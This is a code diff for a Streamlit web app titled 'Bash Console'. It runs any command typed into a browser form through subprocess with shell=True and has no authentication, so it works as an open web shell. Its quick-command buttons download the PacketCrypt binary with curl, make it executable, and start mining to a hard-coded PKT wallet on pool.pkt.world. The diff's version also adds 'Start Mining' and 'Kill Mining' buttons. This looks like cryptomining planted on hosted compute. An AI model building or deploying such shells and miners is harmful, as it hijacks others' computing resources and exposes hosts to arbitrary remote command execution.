@@ -1,110 +1,114 @@
 import streamlit as st
 import subprocess
-import threading
 import time
 
 # Set page configuration
 st.set_page_config(
     page_title="Bash Console",
     page_icon="💻",
-    layout="wide"
+    layout="centered"
 )
 
 # Initialize session state
 if 'console_log' not in st.session_state:
-    st.session_state.console_log = ""
-if 'running_process' not in st.session_state:
-    st.session_state.running_process = None
+    st.session_state.console_log = "Welcome to Bash Console\n\n"
 
 # Simple title
-st.title("Bash Console")
+st.title("💻 Bash Console")
 
 # Command input
-command = st.text_input("Enter bash command:", placeholder="ls -la", key="command_input")
+st.markdown("### Enter Command:")
+command = st.text_input("", placeholder="Enter bash command here...", key="cmd_input")
 
-# Buttons
-col1, col2, col3 = st.columns([2, 2, 2])
-
-with col1:
-    if st.button("Execute", type="primary"):
-        if command.strip():
-            # Add command to log
-            st.session_state.console_log += f"$ {command}\n"
+# Execute button
+if st.button("🚀 Execute Command", type="primary", use_container_width=True):
+    if command.strip():
+        # Add command to log with timestamp
+        timestamp = time.strftime("%H:%M:%S")
+        st.session_state.console_log += f"[{timestamp}] $ {command}\n"
+        
+        try:
+            # Execute command
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=60,  # 60 second timeout
+                cwd="."  # Current directory
+            )
             
-            try:
-                # Execute command and capture output
-                result = subprocess.run(
-                    command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
+            # Add output to log
+            if result.stdout:
+                st.session_state.console_log += result.stdout
+            
+            if result.stderr:
+                st.session_state.console_log += result.stderr
                 
-                # Add stdout to log
-                if result.stdout:
-                    st.session_state.console_log += result.stdout
+            if result.returncode != 0:
+                st.session_state.console_log += f"\n[Process exited with code {result.returncode}]\n"
                 
-                # Add stderr to log
-                if result.stderr:
-                    st.session_state.console_log += result.stderr
-                    
-                # Add return code if non-zero
-                if result.returncode != 0:
-                    st.session_state.console_log += f"[Exit code: {result.returncode}]\n"
-                    
-                st.session_state.console_log += "\n"
-                st.rerun()
-                
-            except subprocess.TimeoutExpired:
-                st.session_state.console_log += "[Command timed out after 30 seconds]\n\n"
-                st.rerun()
-            except Exception as e:
-                st.session_state.console_log += f"[Error: {str(e)}]\n\n"
-                st.rerun()
-
-with col2:
-    if st.button("Clear Log"):
-        st.session_state.console_log = ""
+        except subprocess.TimeoutExpired:
+            st.session_state.console_log += "\n[ERROR: Command timed out after 60 seconds]\n"
+        except Exception as e:
+            st.session_state.console_log += f"\n[ERROR: {str(e)}]\n"
+        
+        st.session_state.console_log += "\n" + "="*50 + "\n\n"
         st.rerun()
 
-with col3:
-    if st.button("Kill Process"):
-        if st.session_state.running_process:
-            try:
-                st.session_state.running_process.terminate()
-                st.session_state.console_log += "[Process terminated]\n\n"
-                st.session_state.running_process = None
-                st.rerun()
-            except:
-                pass
+# Control buttons
+col1, col2 = st.columns(2)
+with col1:
+    if st.button("🧹 Clear Log", use_container_width=True):
+        st.session_state.console_log = "Welcome to Bash Console\n\n"
+        st.rerun()
 
-# Console output area
-st.markdown("### Console Output")
+with col2:
+    if st.button("📁 Show Current Directory", use_container_width=True):
+        st.session_state.cmd_input = "pwd && ls -la"
+        st.rerun()
 
-# Display console log in a text area
+# Console output
+st.markdown("### Console Output:")
 st.text_area(
     "",
     value=st.session_state.console_log,
-    height=500,
+    height=400,
     disabled=True,
-    key="console_output"
+    key="output_area"
 )
 
-# Quick command buttons
-st.markdown("### Quick Commands")
-quick_commands = [
-    "ls -la",
-    "pwd", 
-    "curl -L https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.6.0/packetcrypt-v0.6.0-linux_amd64 -o ppp",
-    "chmod +x ppp",
-    "./ppp ann -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx http://pool.pkt.world"
+# Quick commands section
+st.markdown("### 🚀 Quick Commands:")
+
+quick_cmds = [
+    ("📂 List Files", "ls -la"),
+    ("📍 Current Directory", "pwd"),
+    ("⬇️ Download PacketCrypt", "curl -L https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.6.0/packetcrypt-v0.6.0-linux_amd64 -o ppp"),
+    ("🔧 Make Executable", "chmod +x ppp"),
+    ("⛏️ Start Mining", "./ppp ann -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx http://pool.pkt.world"),
+    ("❌ Kill Mining", "pkill ppp")
 ]
 
-cols = st.columns(2)
-for i, cmd in enumerate(quick_commands):
-    with cols[i % 2]:
-        if st.button(f"{cmd}", key=f"quick_{i}"):
-            # Set the command in the input field
-            st.session_state.command_input = cmd
-            st.rerun()
+# Create buttons in pairs
+for i in range(0, len(quick_cmds), 2):
+    col1, col2 = st.columns(2)
+    
+    with col1:
+        if i < len(quick_cmds):
+            name, cmd = quick_cmds[i]
+            if st.button(name, key=f"quick_{i}", use_container_width=True):
+                st.session_state.cmd_input = cmd
+                st.rerun()
+    
+    with col2:
+        if i + 1 < len(quick_cmds):
+            name, cmd = quick_cmds[i + 1]
+            if st.button(name, key=f"quick_{i+1}", use_container_width=True):
+                st.session_state.cmd_input = cmd
+                st.rerun()
+
+# Info section
+st.markdown("---")
+st.info("💡 **Tips:** Type any bash command and click Execute. Use Quick Commands for common operations.")
+st.caption("⚠️ Long-running commands will timeout after 60 seconds. Mining commands may need to be run in background.")
